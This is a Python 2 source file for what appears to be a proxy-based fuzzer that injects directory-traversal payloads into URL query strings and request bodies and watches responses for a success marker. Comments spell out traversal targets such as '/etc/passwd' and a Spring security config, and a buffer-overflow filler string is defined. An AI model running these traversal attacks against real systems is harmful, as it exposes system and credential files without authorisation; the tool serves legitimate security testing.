# -*- coding: utf-8 -*-
import sys
import os
import socket
import ssl
import select
import httplib
import urlparse
import threading
import gzip
import zlib
import time
import json
import re
import random
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from cStringIO import StringIO
from subprocess import Popen, PIPE
from HTMLParser import HTMLParser
from random import randint

overflowstrings = ["A" * 8192]

def with_color(c, s):
    return "\x1b[%dm%s\x1b[0m" % (c, s)

def dir_traversal_in_url(queries):
    payload=random.choice(list(open('payloads/directorytraversal.txt'))).rstrip('\n')

    (key,val)=queries[0].split('=')
    val=payload     #"../../../../../WEB-INF/spring-security.xml"    #"../../../../../../etc/passwd"
    st=key+'='+val
    
    for q in xrange(1,len(queries)):
        (key,val)=queries[q].split('=')
        val=payload     #"../../../../../WEB-INF/spring-security.xml"    #"../../../../../../etc/passwd"
        st+='&'+key+'='+val
    return st

def fuzz_for_dir_traversal_in_url(req):
    u = urlparse.urlsplit(req.path)
    queries=[]
    if(u.query):
        queries=map(str,u.query.split('&'))
        if(len(queries)):
            st=dir_traversal_in_url(queries)
            if(len(st)!=0):
                s,t=req.path.split('?')
                if(len(t)!=0):
                    req.path=s+'?'+st
                else:
                    req.path=s+st
    elif(u.path and ';' in u.path):
        queries=map(str,u.path.split('&'))
        if(len(queries)):
            (tmp,queries[0])=queries[0].split(';')
            st=dir_traversal_in_url(queries)
            if(len(st)!=0):
                s,t=req.path.split(';')
                if(len(t)!=0):
                    req.path=s+';'+st
                else:
                    req.path=s+st

    return req.path

def dir_traversal_in_body(queries):
    payload=random.choice(list(open('payloads/directorytraversal.txt'))).rstrip('\n')

    (key,val)=queries[0].split('=')
    val=payload     #"../../../../../WEB-INF/spring-security.xml"    #"../../../../../../etc/passwd"
    st=key+'='+val
    
    for q in xrange(1,len(queries)):
        (key,val)=queries[q].split('=')
        val=payload     #"../../../../../WEB-INF/spring-security.xml"    #"../../../../../../etc/passwd"
        st+='&'+key+'='+val
    return st

def fuzz_for_dir_traversal_in_body(req_body):
    queries=[]
    if(req_body):
        queries=map(str,req_body.split('&'))
    if(len(queries)):
        st=dir_traversal_in_body(queries)
        if(len(st)!=0):
            req_body=st
            print with_color(31, "==== REQUEST BODY ====\n%s\n" % req_body)
    return req_body

def verify_dir_traversal_in_body(res_body):
    if(res_body.find("Congratulations")!=-1):   #if(res_body.find("root")!=-1):
        print with_color(31, "==== RESPONSE BODY ====\n%s\n" % res_body)
        os.kill(os.getpid(), 9)
